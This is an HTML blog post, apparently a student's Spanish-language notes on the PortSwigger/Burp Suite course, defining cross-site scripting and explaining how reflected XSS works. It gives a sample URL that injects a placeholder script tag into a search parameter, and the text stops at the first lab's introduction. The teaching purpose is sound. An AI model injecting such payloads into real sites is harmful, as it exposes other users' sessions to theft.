@@ -1,0 +1,1970 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  
+
+  
+
+  <title>11. Cross-Site Scripting.</title>
+
+  
+  <meta name="author" content="Qv1nTv5">
+  
+
+  <meta name="description" content="Detección y explotación de vulnerabilidades de XSS a través de la herramienta BurpSuite.">
+
+  
+
+  
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+      
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    
+      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
+    
+  
+
+  
+
+  
+  
+  
+
+  
+
+  
+  <meta property="og:site_name" content="Home">
+  <meta property="og:title" content="11. Cross-Site Scripting.">
+  <meta property="og:description" content="Detección y explotación de vulnerabilidades de XSS a través de la herramienta BurpSuite.">
+
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:author" content="Qv1nTv5">
+  <meta property="og:article:published_time" content="2022-03-16T00:00:00-04:00">
+  <meta property="og:url" content="http://localhost:4000/2022-03-16-11.Cross-site_scripting_(XSS)/">
+  <link rel="canonical" href="http://localhost:4000/2022-03-16-11.Cross-site_scripting_(XSS)/">
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:site" content="@Qvintvs1">
+  <meta name="twitter:creator" content="@Qvintvs1">
+
+  <meta property="twitter:title" content="11. Cross-Site Scripting.">
+  <meta property="twitter:description" content="Detección y explotación de vulnerabilidades de XSS a través de la herramienta BurpSuite.">
+
+  
+
+  
+
+
+  
+
+  
+
+</head>
+
+
+<body>
+
+  
+
+
+  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="main-navbar">
+    <ul class="navbar-nav ml-auto">
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Program</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/Cpage">C</a>
+                  <a class="dropdown-item" href="/DHARMApage">Dharma</a>
+            </div>
+          </li>
+        
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Pentest</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/BURPSUITEpage">Burp</a>
+                  <a class="dropdown-item" href="/THMpage">Thm</a>
+                  <a class="dropdown-item" href="/HackTheBoxpage">Htb</a>
+                  <a class="dropdown-item" href="/PEN200page">BasicPentesting</a>
+                  <a class="dropdown-item" href="/REDTEAMBASICSpage">RedTeam</a>
+                  <a class="dropdown-item" href="/BLUETEAMBASICSpage">Blueteam</a>
+                  <a class="dropdown-item" href="/REDESpage">Net</a>
+                  <a class="dropdown-item" href="/2022-11-17-GitBasics">Git</a>
+            </div>
+          </li>
+        
+        <li class="nav-item">
+          <a class="nav-link" id="nav-search-link" href="#" title="Search">
+            <span id="nav-search-icon" class="fa fa-search"></span>
+            <span id="nav-search-text">Search</span>
+          </a>
+        </li></ul>
+  </div>
+
+  
+
+  
+
+</nav>
+
+
+
+<div id="beautifuljekyll-search-overlay">
+
+  <div id="nav-search-exit" title="Exit search">✕</div>
+  <input type="text" id="nav-search-input" placeholder="Search">
+  <ul id="search-results-container"></ul>
+  
+  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
+  <script>
+    var searchjson = '[ \
+       \
+        { \
+          "title"    : "2. Constants and Literals in C.", \
+          "category" : "C", \
+          "url"      : "/2024-12-10-1.ConstantsinC-copy/", \
+          "date"     : "December 10, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "1. Basics of C", \
+          "category" : "C", \
+          "url"      : "/2024-12-02-1.BasicsOfC/", \
+          "date"     : "December  2, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "DHA", \
+          "url"      : "/2024-09-24-Dharma_Tutorial/", \
+          "date"     : "September 24, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "fuzz", \
+          "url"      : "/2024-03-22-Dharma_Tutorial-copy/", \
+          "date"     : "March 22, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Mi experiencia con el OSCP", \
+          "category" : "pen", \
+          "url"      : "/2023-11-19-PEN200_Experience/", \
+          "date"     : "November 19, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Client Side", \
+          "category" : "pen", \
+          "url"      : "/2023-11-17-17.Client_Side_Attacks/", \
+          "date"     : "November 17, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Deep Packet Tunneling", \
+          "category" : "pen", \
+          "url"      : "/2023-11-16-16.Tunneling_Through_Deep_Packet_Inspection/", \
+          "date"     : "November 16, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Report", \
+          "category" : "pen", \
+          "url"      : "/2023-11-15-15.Making_Reports/", \
+          "date"     : "November 15, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "pen", \
+          "url"      : "/2023-11-14-14.Metasploit/", \
+          "date"     : "November 14, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Password Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-13-13.Password_Attacks/", \
+          "date"     : "November 13, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Active Directory Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-12-12.Active_Directory_Attacks/", \
+          "date"     : "November 12, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Port Forwarding", \
+          "category" : "pen", \
+          "url"      : "/2023-11-11-11.Port_Forwarding/", \
+          "date"     : "November 11, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Privilege Escalation", \
+          "category" : "pen", \
+          "url"      : "/2023-11-10-10.Privilege_Escalation/", \
+          "date"     : "November 10, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "File Transfers", \
+          "category" : "pen", \
+          "url"      : "/2023-11-09-9.File_Tranfers/", \
+          "date"     : "November  9, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Buffer Overflows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-08-8.Buffer_Overflows/", \
+          "date"     : "November  8, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Vulnerability Scanning.", \
+          "category" : "pen", \
+          "url"      : "/2023-11-07-7.Vulnerability_Scanning/", \
+          "date"     : "November  7, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Information Gathering", \
+          "category" : "pen", \
+          "url"      : "/2023-11-06-6.Active_Information_Gathering/", \
+          "date"     : "November  6, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Windows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-05-5.Windows/", \
+          "date"     : "November  5, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Networking", \
+          "category" : "pen", \
+          "url"      : "/2023-11-04-4.Networking/", \
+          "date"     : "November  4, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Scripting", \
+          "category" : "pen", \
+          "url"      : "/2023-11-03-3.Scripting/", \
+          "date"     : "November  3, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Practical Tools", \
+          "category" : "pen", \
+          "url"      : "/2023-11-02-2.PracticalTools/", \
+          "date"     : "November  2, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Linux", \
+          "category" : "pen", \
+          "url"      : "/2023-11-01-1.Linux/", \
+          "date"     : "November  1, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Easy", \
+          "category" : "hack", \
+          "url"      : "/2022-12-01-Easy/", \
+          "date"     : "December  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Git Basics", \
+          "category" : "", \
+          "url"      : "/2022-11-17-GitBasics/", \
+          "date"     : "November 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier I", \
+          "category" : "hack", \
+          "url"      : "/2022-11-10-Tier_1/", \
+          "date"     : "November 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier 0", \
+          "category" : "hack", \
+          "url"      : "/2022-11-09-Tier_0/", \
+          "date"     : "November  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7.BufferOverflow.", \
+          "category" : "thm", \
+          "url"      : "/2022-11-02-7.BufferOverflow/", \
+          "date"     : "November  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6.Offensive Pentesting", \
+          "category" : "thm", \
+          "url"      : "/2022-11-01-6.OffensivePentesting/", \
+          "date"     : "November  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5.RedTeam", \
+          "category" : "thm", \
+          "url"      : "/2022-10-30-5.RedTeam/", \
+          "date"     : "October 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4.Windows", \
+          "category" : "thm", \
+          "url"      : "/2022-10-22-4.Windows/", \
+          "date"     : "October 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3.Junior Penetrationtester path", \
+          "category" : "thm", \
+          "url"      : "/2022-09-02-3.JRPenetrationTester/", \
+          "date"     : "September  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2.Complete Begginer path.", \
+          "category" : "thm", \
+          "url"      : "/2022-08-07-2.CompleteBegginer/", \
+          "date"     : "August  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1.Pre-Security path.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-11-1Pre-Security/", \
+          "date"     : "July 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "0.Scripting for pentesters.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-10-0.Scripting_for_pentesters/", \
+          "date"     : "July 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Burp Certified Practitioner Practice Exam.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-30-PracticeExam/", \
+          "date"     : "March 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "22. OAuth Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-27-22.OAuth_authentication/", \
+          "date"     : "March 27, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "21. HTTP Request Smuggling.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-26-21.HTTP_request_smuggling/", \
+          "date"     : "March 26, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "20. HTTP Host Header Attacks.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-25-20.HTTP_Host_header_attacks/", \
+          "date"     : "March 25, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "19. Web Cache Poisoning.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-24-19.Web_cache_poisoning/", \
+          "date"     : "March 24, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "18. Server-Side Template Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-23-18.Serve-side_template_injection/", \
+          "date"     : "March 23, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "17. Insecure Deserialization.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-22-17.Insecure_deserialization/", \
+          "date"     : "March 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "16. WebSockets.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-21-16.WebSockets/", \
+          "date"     : "March 21, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "15.DOM-based XSS vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-20-15-DOM-based_vulnerabilities/", \
+          "date"     : "March 20, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "14. Clickjacking.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-19-14.Clickjacking/", \
+          "date"     : "March 19, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "13. Cross-Origin Resource Sharing.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-18-13.Cross-origin_resource_sharing_(CORS)/", \
+          "date"     : "March 18, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "12. Cross-Site Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-17-12.Cross-site_request_forgery_(CSRF)/", \
+          "date"     : "March 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "11. Cross-Site Scripting.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-16-11.Cross-site_scripting_(XSS)/", \
+          "date"     : "March 16, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "10. XXE Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-15-10.XXE_injection/", \
+          "date"     : "March 15, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "9. Server-Side Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-14-9.Server-side_request_forgery/", \
+          "date"     : "March 14, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "8. File Upload.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-13-8.File_upload_vulnerabilities/", \
+          "date"     : "March 13, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7. Access Control.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-12-7.Access_control/", \
+          "date"     : "March 12, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6. Information Disclosure.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-11-6.Information_disclosure/", \
+          "date"     : "March 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5. Bussiness Logic Vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-10-5.Business_logic_vulnerabilities/", \
+          "date"     : "March 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4. Command Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-09-4.Command_Injection/", \
+          "date"     : "March  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3. Directory Traversal.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-08-3.Directory_Traversal/", \
+          "date"     : "March  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2. Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-07-2.Authentication/", \
+          "date"     : "March  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1. SQLInjection", \
+          "category" : "burp", \
+          "url"      : "/2022-03-06-1.SQLInjection/", \
+          "date"     : "March  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Seguridad Perimetral", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Seguridad_Perimetral/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Hardening de sistemas", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Hardening_de_sistemas/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Bandit", \
+          "category" : "otw", \
+          "url"      : "/2022-02-08-Bandit/", \
+          "date"     : "February  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Proxy", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Proxys/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Protocolos Relevantes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Protocolos_Importantes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Curso Básico Redes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Precurso_Redes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "IPs", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-IPs/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Movimientos Laterales", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-06-Introducci%C3%B3n_a_movimientos_laterales/", \
+          "date"     : "February  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Evasión de Defensas", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Evasi%C3%B3n_de_Defensas/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Escalada de privilegios", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Escalada_de_privilegios/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-04-Metasploit_B%C3%A1sico/", \
+          "date"     : "February  4, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a aplicaciones Android", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-03-Ataques_aplicaciones_android/", \
+          "date"     : "February  3, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataque a aplicaciones web.", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-02-Ataques_a_aplicaciones_web/", \
+          "date"     : "February  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a Infraestructuras y Redes", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-01-Ataques_a_Infraestructuras_y_Redes/", \
+          "date"     : "February  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Análisis de Objetivos", \
+          "category" : "redteam", \
+          "url"      : "/2022-01-28-An%C3%A1lisis_de_Objetivos/", \
+          "date"     : "January 28, 2022" \
+        }, \
+       \
+       \
+        { \
+          "title"    : "Blueteam Basics", \
+          "category" : "page", \
+          "url"      : "/BLUETEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PortSwigger BurpSuite Course", \
+          "category" : "page", \
+          "url"      : "/BURPSUITEpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "C programming subjects.", \
+          "category" : "page", \
+          "url"      : "/Cpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Dharma Fuzzer language", \
+          "category" : "page", \
+          "url"      : "/DHARMApage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Exploiting &amp; Reversing", \
+          "category" : "page", \
+          "url"      : "/EXPREVpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Fuzzing JavaScript Engine", \
+          "category" : "page", \
+          "url"      : "/Fuzzpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "HackTheBox", \
+          "category" : "page", \
+          "url"      : "/HackTheBoxpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PEN200 notes", \
+          "category" : "page", \
+          "url"      : "/PEN200page/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Proyectos", \
+          "category" : "page", \
+          "url"      : "/PROJECTSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Networking Basics", \
+          "category" : "page", \
+          "url"      : "/REDESpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "RedTeam Basics", \
+          "category" : "page", \
+          "url"      : "/REDTEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Retired Machines", \
+          "category" : "page", \
+          "url"      : "/RetiredMachinespage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "TryHackMe", \
+          "category" : "page", \
+          "url"      : "/THMpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "About me", \
+          "category" : "page", \
+          "url"      : "/aboutme/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "THM", \
+          "category" : "page", \
+          "url"      : "/preOSCPpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Tag Index", \
+          "category" : "page", \
+          "url"      : "/tags/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page2/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page3/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page4/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page5/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page6/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page7/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page8/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page9/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page10/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page11/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page12/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page13/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page14/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page15/", \
+          "date"     : "January 1, 1970" \
+        } \
+       \
+    ]';
+    searchjson = JSON.parse(searchjson);
+
+    var sjs = SimpleJekyllSearch({
+      searchInput: document.getElementById('nav-search-input'),
+      resultsContainer: document.getElementById('search-results-container'),
+      json: searchjson
+    });
+  </script>
+</div>
+
+
+
+
+
+  <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>11. Cross-Site Scripting.</h1>
+          
+            
+              <h2 class="post-subheading">Detección y explotación de vulnerabilidades de XSS a través de la herramienta BurpSuite.</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on March 16, 2022</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class=" container-md ">
+  <div class="row">
+    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">
+
+      
+
+      
+
+      <article role="main" class="blog-post">
+        <h2 id="0-índice">0. Índice.</h2>
+
+<ul>
+  <li>1 Concepto de Cross-Site Scripting (XSS).
+    <ul>
+      <li>1.1. Definición de la vulnerabilidad.</li>
+      <li>1.2. Detectando vulnerabilidades XSS.</li>
+    </ul>
+  </li>
+  <li>2 Tipos de ataques XSS.
+    <ul>
+      <li>2.1. Reflected XSS.
+        <ul>
+          <li>2.1.1. Presentación.</li>
+          <li>2.1.2. Impacto del reflected XSS.</li>
+          <li>2.1.3. Exploración de Reflected XSS.</li>
+        </ul>
+      </li>
+      <li>2.2. Stored XSS.
+        <ul>
+          <li>2.2.1. Definición.</li>
+          <li>2.2.2. Diferencias entre el Stored y el Reflected XSS.</li>
+          <li>2.2.3. Exploración de Stored XSS vulnerabilities.</li>
+        </ul>
+      </li>
+      <li>2.3. DOM-based XSS.
+        <ul>
+          <li>2.3.1. Antecedentes.</li>
+          <li>2.3.2. Presentación de la vulnerabilidad.</li>
+          <li>2.3.3. Testeo de vulnerabilidades DOM-based.</li>
+          <li>2.3.4. Exploiting de DOM-based XSS con diferentes fuentes y sumideros.</li>
+        </ul>
+      </li>
+      <li>2.4. DOM XSS en combinación con Reflected y Stored XSS.</li>
+    </ul>
+  </li>
+  <li>3 Utilidad de las distintas vulnerabilidades XSS.
+    <ul>
+      <li>3.1. Exploiting cross-site scripting to steal cookies.</li>
+      <li>3.2. Exploiting cross-site scripting to perfom CSRF.</li>
+      <li>3.3. Exploiting cross-site scripting to perfom CSRF.</li>
+    </ul>
+  </li>
+  <li>4 Cómo encontrar y testear vulnerabilidades XSS.
+    <ul>
+      <li>4.1. Cross-site scripting context.</li>
+      <li>4.2. XSS between HTML tags.</li>
+      <li>4.3. XSS in HTML tag attributes.</li>
+      <li>4.4. XSS in JavaScript.</li>
+    </ul>
+
+    <p><br /></p>
+  </li>
+</ul>
+
+<h3 id="1-concepto-de-cross-site-scripting-xss">1. Concepto de Cross-Site Scripting (XSS).</h3>
+
+<h4 id="11-definición-de-la-vulnerabilidad">1.1. Definición de la vulnerabilidad.</h4>
+
+<p>El XSS se trata de un conjunto de vulnerabilidades web que permite a un atacante comprometer las interacciones que el resto de usuarios pueden tener con una aplicación web.</p>
+
+<p>Actúa <strong>manipulando un sitio web para que devuelva código JavaScript malicioso a los usuarios</strong>. Cuando el código malicioso se ejecuta dentro del navegador de una víctima, el atacante puede comprometer la interacción que el usuario tiene con la aplicación.</p>
+
+<p><br /></p>
+
+<h4 id="12-detectando-vulnerabilidades-xss">1.2. Detectando vulnerabilidades XSS.</h4>
+
+<p>Se pueden confirmar la mayoría de las vulnerabilidades XSS inyectando un payload que cause que tu propio navegador ejecute JavaScript. Para dicho propósito se suele utilizar la función <strong>alert()</strong> que saca un mensaje por pantalla en el navegador. Sin embargo, a partir de Junio de 2021, en los navegadores Chrome se utiliza la función <strong>print()</strong> ya que no permiten la ejecución de alert().</p>
+
+<p>La forma de invocar esa alerta dependerá del tipo de XSS con la que estemos tratando.</p>
+
+<p><br /></p>
+
+<h3 id="2-tipos-de-ataques-xss">2. Tipos de ataques XSS.</h3>
+
+<p>Podemos discernir fundamentalmente entre tres clases de XSS. Reflected, Stored y Dom-based XSS.</p>
+
+<p><br /></p>
+
+<h4 id="21-reflected-xss">2.1. Reflected XSS.</h4>
+
+<h5 id="211-presentación">2.1.1. Presentación.</h5>
+<p>Esta es la variedad más simple de implementar un ataque XSS.</p>
+
+<p><strong>Se implementa cuando una aplicación recibe datos en la HTTP request que incluye en la HTTP response sin saneamiento de código</strong></p>
+
+<p>Por ejemplo, supongámos una aplicación web que por alguna razón incluye dentro del html de la respuesta HTTP un mensaje que el usuario incluye en la HTTP request. Supongámos la URL que el usuario manda:</p>
+
+<pre><code class="language-default">https://insecure-website.com/search?term=gift
+</code></pre>
+
+<p>Y en la respuesta HTTP podemos encontrar el valor del parámetro “term” incrustado en el html en forma de cabecera:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p&gt;</span>You searched for: gift<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>De esta forma, si el sitio web no implementa saneamiento en contra de XSS, un atacante podría implementar un script malicioso de JavaScript en el parámetro “term”:</p>
+
+<pre><code class="language-default">https://insecure-website.com/search?term=&lt;script&gt; ScriptMalicioso&lt;/script&gt;
+</code></pre>
+
+<p>y si un usuario “pinchase” en la URL que el atacante fabrica (porque por ejemplo se le envía por email, por mensaje de teléfono, etc) se le devolvería una respuesta maliciosa por parte del servidor que contendría en el html la siguiente línea:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p&gt;&lt;script&gt;</span><span class="nx">ScriptMalicioso</span><span class="nt">&lt;/script&gt;&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>Que desembocaría en la ejecución del script malicioso por parte del navegador de la víctima comprometiendo su integridad.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 1: Reflected XSS into HTML context with nothing encoded</strong>.</p>
+
+<p>Este laboraotorio contiene una vulnerabilidad XSS y para identificarla vamos a desplegar una alerta mediante alert().</p>
+
